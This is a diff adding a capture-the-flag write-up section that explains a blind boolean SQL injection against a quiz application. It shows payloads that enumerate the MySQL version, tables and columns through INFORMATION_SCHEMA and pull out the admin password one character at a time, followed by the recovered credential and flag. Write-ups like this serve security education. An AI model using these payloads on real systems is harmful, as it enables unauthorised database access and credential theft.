@@ -318,7 +318,38 @@ On the score page, we have an important information for the resolution of the ch
 
 For our first participation, we get : ```There is 1 other player(s) with the same name as you!```  
 
+We quickly realize that by putting the payload ```louzogh' or 1=1#```, we fill out the quiz, we get the following result : ```There is 68852 other player(s) with the same name as you!```   
 
+**So there is a Blind Boolean SQL injection !**  
+
+We then put a condition on the string ```There is 0 other player(s) with the same name as you!``` to validate our condition in our SQL query !   
+If the string ```There is 0 other player(s) with the same name as you!``` is not present in the answer of our request, then our SQL request is valid !   
+
+I first retrieved the version and validated the database engine using the payload ```louzogh' or ascii(substring(@@version,<incremental counter>,1))=<characters>```  
+The version was the latest version of the MySQL engine : ```8.0.22```.  
+
+After a first automation, I find the name of the database : ```quiz```.
+
+By using the payload ```louzogh' or (SELECT count(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'quiz')=2#```, we know that the database contains two tables.  
+
+The payload ```louzogh' or (SELECT LENGTH(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'quiz' limit 0,1)=5#``` tells us that the first table is 5 characters long !  
+
+Thanks to the payload ```data = {"name": "louzogh' or (select (select ascii(substring(TABLE_NAME," + str(count) + ",1)) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'quiz' limit 0,1))=" + str(offset) + "#"}``` and the ASCII table, we are able to retrieve the name of the table: ```admin```.  
+
+The second table concerns the operation of the application, its name is : ```quiz```.  
+
+By automating, we find that the first 3 columns of the ```admin``` table are : ```id, username, password```, so I stopped there and started the recovery of the admin users.  
+
+The first user has ```id=1``` and his username is ```admin```.  
+
+Finally, in order to retrieve the password of this user, I used the payload : 
+```data = {"name": "louzogh' or (select (select ascii(substring(password," + str(count) + ",1)) FROM admin where id=1))=" + str(offset) + "#"}```.  
+
+P.S : My script was python3, and I used the ASCII table to test the different characters (offset parameter).   
+
+**The admin account was : admin:S3creT_p4ssw0rd-$**  
+
+**FLAG : flag{6e8a2df4-5b14-400f-a85a-08a260b59135}**
  
 
 ## Day 10 - Signup Manager
